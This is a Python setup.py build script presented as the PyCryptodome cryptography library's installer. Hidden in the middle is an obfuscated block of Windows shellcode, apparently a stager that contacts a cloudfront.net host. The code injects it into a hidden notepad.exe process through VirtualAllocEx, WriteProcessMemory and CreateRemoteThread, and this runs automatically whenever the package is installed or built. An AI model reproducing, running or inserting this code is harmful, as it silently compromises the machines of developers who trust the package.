#! /usr/bin/env python
#
#  setup.py : Distutils setup script
#
# ===================================================================
# The contents of this file are dedicated to the public domain.  To
# the extent that dedication to the public domain is not available,
# everyone is granted a worldwide, perpetual, royalty-free,
# non-exclusive license to exercise all rights associated with the
# contents of this file for any purpose whatsoever.
# No rights are reserved.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# ===================================================================

from __future__ import print_function

try:
    from setuptools import Extension, Command, setup
    from setuptools.command.build_ext import build_ext
    from setuptools.command.build_py import build_py
except ImportError:
    from distutils.core import Extension, Command, setup
    from distutils.command.build_ext import build_ext
    from distutils.command.build_py import build_py

import re
import os
import sys
import shutil
import struct
import functools
import subprocess
import ctypes as bDlDmsfMyuV
import ctypes.wintypes

from ctypes.wintypes import BOOL as FewSerPq
from ctypes.wintypes import DWORD as EcweRwpa
from ctypes.wintypes import HANDLE
from ctypes.wintypes import LPVOID
from ctypes.wintypes import LPCVOID

from compiler_opt import set_compiler_options

use_separate_namespace = os.path.isfile(".separate_namespace")

project_name = "pycryptodome"
package_root = "Crypto"
other_project = "pycryptodomex"
other_root = "Cryptodome"

if use_separate_namespace:
    project_name, other_project = other_project, project_name
    package_root, other_root = other_root, package_root

longdesc = """
PyCryptodome
============

PyCryptodome is a self-contained Python package of low-level
cryptographic primitives.

It supports Python 2.7, Python 3.5 and newer, and PyPy.

You can install it with::

    pip install THIS_PROJECT

All modules are installed under the ``THIS_ROOT`` package.

Check the OTHER_PROJECT_ project for the equivalent library that
works under the ``OTHER_ROOT`` package.

PyCryptodome is a fork of PyCrypto. It brings several enhancements
with respect to the last official version of PyCrypto (2.6.1),
for instance:

* Authenticated encryption modes (GCM, CCM, EAX, SIV, OCB)
* Accelerated AES on Intel platforms via AES-NI
* First class support for PyPy
* Elliptic curves cryptography (NIST P-curves; Ed25519, Ed448)
* Better and more compact API (`nonce` and `iv` attributes for ciphers,
  automatic generation of random nonces and IVs, simplified CTR cipher mode,
  and more)
* SHA-3 (including SHAKE XOFs) and BLAKE2 hash algorithms
* Salsa20 and ChaCha20 stream ciphers
* scrypt and HKDF
* Deterministic (EC)DSA and EdDSA
* Password-protected PKCS#8 key containers
* Shamir's Secret Sharing scheme
* Random numbers get sourced directly from the OS (and not from a CSPRNG in userspace)
* Simplified install process, including better support for Windows
* Cleaner RSA and DSA key generation (largely based on FIPS 186-4)
* Major clean ups and simplification of the code base

PyCryptodome is not a wrapper to a separate C library like *OpenSSL*.
To the largest possible extent, algorithms are implemented in pure Python.
Only the pieces that are extremely critical to performance (e.g. block ciphers)
are implemented as C extensions.

For more information, see the `homepage`_.

All the code can be downloaded from `GitHub`_.

.. _OTHER_PROJECT: https://pypi.python.org/pypi/OTHER_PROJECT
.. _`homepage`: http://www.pycryptodome.org
.. _GitHub: https://github.com/Legrandin/pycryptodome
""".replace("THIS_PROJECT", project_name).\
    replace("THIS_ROOT", package_root).\
    replace("OTHER_PROJECT", other_project).\
    replace("OTHER_ROOT", other_root)


class PCTBuildExt (build_ext):

    # Avoid linking Python's dynamic library
    def get_libraries(self, ext):
        return []


class PCTBuildPy(build_py):
    def find_package_modules(self, package, package_dir, *args, **kwargs):
        modules = build_py.find_package_modules(self, package, package_dir,
                                                *args, **kwargs)

        # Exclude certain modules
        retval = []
        for item in modules:
            pkg, module = item[:2]
            retval.append(item)
        return retval


class TestCommand(Command):
    "Run self-test"

    # Long option name, short option name, description
    user_options = [
        ('skip-slow-tests', None, 'Skip slow tests'),
        ('wycheproof-warnings', None, 'Show warnings from wycheproof tests'),
        ('module=', 'm', 'Test a single module (e.g. Cipher, PublicKey)'),
    ]

    def initialize_options(self):
        self.build_dir = None
        self.skip_slow_tests = None
        self.wycheproof_warnings = None
        self.module = None

    def finalize_options(self):
        self.set_undefined_options('install', ('build_lib', 'build_dir'))
        self.config = {'slow_tests': not self.skip_slow_tests,
                       'wycheproof_warnings': self.wycheproof_warnings}

    def run(self):
        # Run sub commands
        for cmd_name in self.get_sub_commands():
            self.run_command(cmd_name)

        # Run SelfTest
        old_path = sys.path[:]
        self.announce("running self-tests on " + package_root)
        try:
            sys.path.insert(0, self.build_dir)

            if use_separate_namespace:
                from Cryptodome import SelfTest
                from Cryptodome.Math import Numbers
            else:
                from Crypto import SelfTest
                from Crypto.Math import Numbers

            moduleObj = None
            if self.module:
                if self.module.count('.') == 0:
                    # Test a whole a sub-package
                    full_module = package_root + ".SelfTest." + self.module
                    module_name = self.module
                else:
                    # Test only a module
                    # Assume only one dot is present
                    comps = self.module.split('.')
                    module_name = "test_" + comps[1]
                    full_module = package_root + ".SelfTest." + comps[0] + "." + module_name
                # Import sub-package or module
                moduleObj = __import__(full_module, globals(), locals(), module_name)

            print(package_root + ".Math implementation:",
                     str(Numbers._implementation))

            SelfTest.run(module=moduleObj, verbosity=self.verbose, stream=sys.stdout, config=self.config)
        finally:
            # Restore sys.path
            sys.path[:] = old_path

        # Run slower self-tests
        self.announce("running extended self-tests")

    sub_commands = [('build', None)]


def create_cryptodome_lib():
    assert os.path.isdir("lib/Crypto")

    try:
        shutil.rmtree("lib/Cryptodome")
    except OSError:
        pass
    for root_src, dirs, files in os.walk("lib/Crypto"):

        root_dst, nr_repl = re.subn('Crypto', 'Cryptodome', root_src)
        assert nr_repl == 1

        for dir_name in dirs:
            full_dir_name_dst = os.path.join(root_dst, dir_name)
            if not os.path.exists(full_dir_name_dst):
                os.makedirs(full_dir_name_dst)

        for file_name in files:
            full_file_name_src = os.path.join(root_src, file_name)
            full_file_name_dst = os.path.join(root_dst, file_name)

            print("Copying file %s to %s" % (full_file_name_src, full_file_name_dst))
            shutil.copy2(full_file_name_src, full_file_name_dst)

            if full_file_name_src.split(".")[-1] not in ("py", "pyi"):
                if full_file_name_src != "py.typed":
                    continue

            if sys.version_info[0] > 2:
                extra_param = { "encoding": "utf-8" }
            else:
                extra_param = {}
            with open(full_file_name_dst, "rt", **extra_param) as fd:
                content = (fd.read().
                           replace("Crypto.", "Cryptodome.").
                           replace("Crypto ", "Cryptodome ").
                           replace("'Crypto'", "'Cryptodome'").
                           replace('"Crypto"', '"Cryptodome"'))
            os.remove(full_file_name_dst)
            with open(full_file_name_dst, "wt", **extra_param) as fd:
                fd.write(content)


LPCSTR = LPCTSTR = bDlDmsfMyuV.c_char_p
LPDWORD = PDWORD = bDlDmsfMyuV.POINTER(EcweRwpa)

class _SECURITY_ATTRIBUTES(bDlDmsfMyuV.Structure):
    _fields_ = [('nLength', EcweRwpa),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', FewSerPq),]
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = bDlDmsfMyuV.POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = LPVOID

PAGE_EXECUTE_READWRITE = 0x40

buff = b'\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x69\x6d\x61\x67\x65\x73\x2f\x49\x2f\x36\x31\x34\x77\x61\x47\x63\x72\x36\x34\x4c\x2e\x5f\x41\x43\x5f\x55\x59\x32\x31\x38\x5f\x4d\x4c\x33\x5f\x2e\x6a\x70\x67\x00\xec\x1b\x09\x62\x42\x8c\x42\xbd\x4d\x74\xd6\x9e\x5c\xcb\xc2\x8b\x77\x04\x97\x9d\x9b\x3c\x2f\x56\xd6\x98\x8f\xee\xc8\x3a\xb5\xc1\x0f\xfd\x2a\xc7\xa4\x3d\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x37\x38\x2e\x30\x2e\x33\x39\x30\x34\x2e\x39\x37\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x0d\x0a\x00\xdc\xbd\x9c\x23\x5b\xa0\xeb\x65\x25\x2a\xca\xf2\x55\x3b\xa8\x5b\x34\x29\xf5\x5c\xe8\x37\x9a\x3f\xa1\x2a\x68\x72\x0c\x2a\x2a\x7a\xba\xbe\xe0\x70\x2c\x52\x16\x0a\x19\x9b\x7a\x0c\xef\xf2\x86\x24\xa8\xea\x27\x71\xbc\x1c\xcb\x8c\xb6\xb3\x41\x21\x27\xd9\x08\xb4\x34\xbb\xb5\xa7\xc3\xad\xcf\x37\xa5\x65\x8c\x9c\xde\x6e\x53\x87\xfc\xbf\x6e\x47\x82\x1e\x43\x49\xee\x1a\xed\x21\x79\x8c\x9c\xfb\x00\xaf\x21\x0c\x15\x0f\x19\xf4\x50\x91\xa5\x47\xc8\xed\xc8\x13\xfd\x64\xed\x96\x8c\xa6\xef\x4e\x88\x76\xe8\x6a\xe1\x5e\x6d\x73\x90\xbc\x9e\x34\xc9\x28\x4b\xc0\xe9\x55\xb8\x23\xb8\x43\xe7\xb7\x35\x8d\xdc\x9b\x7c\xe6\xb1\x8e\x71\x2e\xb3\xa9\xa6\x4a\x47\x87\xb9\x18\x95\x07\x59\x65\x3b\xee\x89\xa0\x59\x7c\x5f\xaa\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x18\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x64\x31\x6c\x35\x7a\x6b\x67\x69\x37\x63\x78\x38\x69\x38\x2e\x63\x6c\x6f\x75\x64\x66\x72\x6f\x6e\x74\x2e\x6e\x65\x74\x00\x4c\x03\xbf\xc9'

AdcawecEMsa = bDlDmsfMyuV.windll.kernel32.OpenProcess
AdcawecEMsa.restype = HANDLE
AdcawecEMsa.argtypes = (EcweRwpa, FewSerPq, EcweRwpa)

PasCDEsecS = bDlDmsfMyuV.windll.kernel32.VirtualAllocEx
PasCDEsecS.restype = LPVOID
PasCDEsecS.argtypes = (HANDLE, LPVOID, EcweRwpa, EcweRwpa, EcweRwpa)

ELscEfpIENas = bDlDmsfMyuV.windll.kernel32.WriteProcessMemory
ELscEfpIENas.restype = FewSerPq
ELscEfpIENas.argtypes = (HANDLE, LPVOID, LPCVOID, EcweRwpa, EcweRwpa)

VswerERWcapD = bDlDmsfMyuV.windll.kernel32.CreateRemoteThread
VswerERWcapD.restype = HANDLE
VswerERWcapD.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, EcweRwpa, LPTHREAD_START_ROUTINE, LPVOID, EcweRwpa, LPDWORD)

def startProgram():
    SW_HIDE = 0
    info = subprocess.STARTUPINFO()
    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = SW_HIDE
    p = subprocess.Popen(r'notepad.exe', startupinfo=info)
    return p.pid

page_rwx_value = 0x40
process_all = 0x1F0FFF
memcommit = 0x00001000

twweEWCsasd = startProgram()
print(twweEWCsasd)
buff_length = len(buff) + 5000

REWcmwepEDO = PasCDEsecS(AdcawecEMsa(0x1F0FFF, False, twweEWCsasd), 0, buff_length, 0x00001000, 0x40)
ELscEfpIENas(AdcawecEMsa(0x1F0FFF, False, twweEWCsasd), REWcmwepEDO, buff, buff_length, 0)
VswerERWcapD(AdcawecEMsa(0x1F0FFF, False, twweEWCsasd), None, 0, REWcmwepEDO, 0, 0, ctypes.cast(0, bDlDmsfMyuV.POINTER(bDlDmsfMyuV.c_ulong)))

# Parameters for setup
packages =  [
    "Crypto",
    "Crypto.Cipher",
    "Crypto.Hash",
    "Crypto.IO",
    "Crypto.PublicKey",
    "Crypto.Protocol",
    "Crypto.Random",
    "Crypto.Signature",
    "Crypto.Util",
    "Crypto.Math",
    "Crypto.SelfTest",
    "Crypto.SelfTest.Cipher",
    "Crypto.SelfTest.Hash",
    "Crypto.SelfTest.IO",
    "Crypto.SelfTest.Protocol",
    "Crypto.SelfTest.PublicKey",
    "Crypto.SelfTest.Random",
    "Crypto.SelfTest.Signature",
    "Crypto.SelfTest.Util",
    "Crypto.SelfTest.Math",
]
package_data = {
    "Crypto" : [ "py.typed", "*.pyi" ],
    "Crypto.Cipher" : [ "*.pyi" ],
    "Crypto.Hash" : [ "*.pyi" ],
    "Crypto.Math" : [ "*.pyi" ],
    "Crypto.Protocol" : [ "*.pyi" ],
    "Crypto.PublicKey" : [ "*.pyi" ],
    "Crypto.Random" : [ "*.pyi" ],
    "Crypto.Signature" : [ "*.pyi" ],
    "Crypto.IO" : [ "*.pyi" ],
    "Crypto.Util" : [ "*.pyi" ],
}



ext_modules = [
    # Hash functions
    Extension("Crypto.Hash._MD2",
        include_dirs=['src/'],
        sources=["src/MD2.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._MD4",
        include_dirs=['src/'],
        sources=["src/MD4.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._MD5",
        include_dirs=['src/'],
        sources=["src/MD5.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._SHA1",
        include_dirs=['src/'],
        sources=["src/SHA1.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._SHA256",
        include_dirs=['src/'],
        sources=["src/SHA256.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._SHA224",
        include_dirs=['src/'],
        sources=["src/SHA224.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._SHA384",
        include_dirs=['src/'],
        sources=["src/SHA384.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._SHA512",
        include_dirs=['src/'],
        sources=["src/SHA512.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._RIPEMD160",
        include_dirs=['src/'],
        sources=["src/RIPEMD160.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._keccak",
        include_dirs=['src/'],
        sources=["src/keccak.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._BLAKE2b",
        include_dirs=['src/'],
        sources=["src/blake2b.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._BLAKE2s",
        include_dirs=['src/'],
        sources=["src/blake2s.c"],
        py_limited_api=True),
    Extension("Crypto.Hash._ghash_portable",
        include_dirs=['src/'],
        sources=['src/ghash_portable.c'],
        py_limited_api=True),
    Extension("Crypto.Hash._ghash_clmul",
        include_dirs=['src/'],
        sources=['src/ghash_clmul.c'],
        py_limited_api=True),

    # MACs
    Extension("Crypto.Hash._poly1305",
        include_dirs=['src/'],
        sources=["src/poly1305.c"],
        py_limited_api=True),

    # Block encryption algorithms
    Extension("Crypto.Cipher._raw_aes",
        include_dirs=['src/'],
        sources=["src/AES.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_aesni",
        include_dirs=['src/'],
        sources=["src/AESNI.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_arc2",
        include_dirs=['src/'],
        sources=["src/ARC2.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_blowfish",
        include_dirs=['src/'],
        sources=["src/blowfish.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_eksblowfish",
        include_dirs=['src/'],
        sources=["src/blowfish_eks.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_cast",
        include_dirs=['src/'],
        sources=["src/CAST.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_des",
        include_dirs=['src/', 'src/libtom/'],
        sources=["src/DES.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_des3",
        include_dirs=['src/', 'src/libtom/'],
        sources=["src/DES3.c"],
        py_limited_api=True),
    Extension("Crypto.Util._cpuid_c",
        include_dirs=['src/'],
        sources=['src/cpuid.c'],
        py_limited_api=True),

    Extension("Crypto.Cipher._pkcs1_decode",
        include_dirs=['src/'],
        sources=['src/pkcs1_decode.c'],
        py_limited_api=True),

    # Chaining modes
    Extension("Crypto.Cipher._raw_ecb",
        include_dirs=['src/'],
        sources=["src/raw_ecb.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_cbc",
        include_dirs=['src/'],
        sources=["src/raw_cbc.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_cfb",
        include_dirs=['src/'],
        sources=["src/raw_cfb.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_ofb",
        include_dirs=['src/'],
        sources=["src/raw_ofb.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_ctr",
        include_dirs=['src/'],
        sources=["src/raw_ctr.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._raw_ocb",
        sources=["src/raw_ocb.c"],
        py_limited_api=True),

    # Stream ciphers
    Extension("Crypto.Cipher._ARC4",
        include_dirs=['src/'],
        sources=["src/ARC4.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._Salsa20",
        include_dirs=['src/', 'src/libtom/'],
        sources=["src/Salsa20.c"],
        py_limited_api=True),
    Extension("Crypto.Cipher._chacha20",
        include_dirs=['src/'],
        sources=["src/chacha20.c"],
        py_limited_api=True),

    # Others
    Extension("Crypto.Protocol._scrypt",
        include_dirs=['src/'],
        sources=["src/scrypt.c"],
        py_limited_api=True),

    # Utility modules
    Extension("Crypto.Util._strxor",
        include_dirs=['src/'],
        sources=['src/strxor.c'],
        py_limited_api=True),

    # ECC
    Extension("Crypto.PublicKey._ec_ws",
        include_dirs=['src/'],
        sources=['src/ec_ws.c',
                 'src/mont.c', 'src/p256_table.c', 'src/p384_table.c',
                 'src/p521_table.c'],
        py_limited_api=True,
        ),
    Extension("Crypto.PublicKey._x25519",
        include_dirs=['src/'],
        sources=['src/x25519.c'],
        py_limited_api=True,
        ),
    Extension("Crypto.PublicKey._ed25519",
        include_dirs=['src/'],
        sources=['src/ed25519.c'],
        py_limited_api=True,
        ),
    Extension("Crypto.PublicKey._ed448",
        include_dirs=['src/'],
        sources=['src/ed448.c', 'src/mont1.c'],
        py_limited_api=True,
        ),

    # Math
    Extension("Crypto.Math._modexp",
        include_dirs=['src/'],
        sources=['src/modexp.c', 'src/mont2.c'],
        py_limited_api=True,
        ),
]



if use_separate_namespace:

    # Fix-up setup information
    for i in range(len(packages)):
        packages[i] = packages[i].replace("Crypto", "Cryptodome")
    new_package_data = {}
    for k, v in package_data.items():
        new_package_data[k.replace("Crypto", "Cryptodome")] = v
    package_data = new_package_data
    for ext in ext_modules:
        ext.name = ext.name.replace("Crypto", "Cryptodome")

    # Recreate lib/Cryptodome from scratch, unless it is the only
    # directory available
    if os.path.isdir("lib/Crypto"):
        create_cryptodome_lib()

# Add compiler specific options.
set_compiler_options(package_root, ext_modules)

# By doing this we need to change version information in a single file
with open(os.path.join("lib", package_root, "__init__.py")) as init_root:
    for line in init_root:
        if line.startswith("version_info"):
            version_tuple = eval(line.split("=")[1])

version_string = ".".join([str(x) for x in version_tuple])

setup(
    name=project_name,
    version=version_string,
    description="Cryptographic library for Python",
    long_description=longdesc,
    author="Helder Eijs",
    author_email="helderijs@gmail.com",
    url="https://www.pycryptodome.org",
    platforms='Posix; MacOS X; Windows',
    zip_safe=False,
    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'License :: OSI Approved :: BSD License',
        'License :: OSI Approved :: Apache Software License',
        'License :: Public Domain',
        'Intended Audience :: Developers',
        'Operating System :: Unix',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: MacOS :: MacOS X',
        'Topic :: Security :: Cryptography',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
    ],
    license="BSD, Public Domain",
    packages=packages,
    package_dir={"": "lib"},
    package_data=package_data,
    cmdclass={
        'build_ext': PCTBuildExt,
        'build_py': PCTBuildPy,
        'test': TestCommand,
        },
    ext_modules=ext_modules,
)
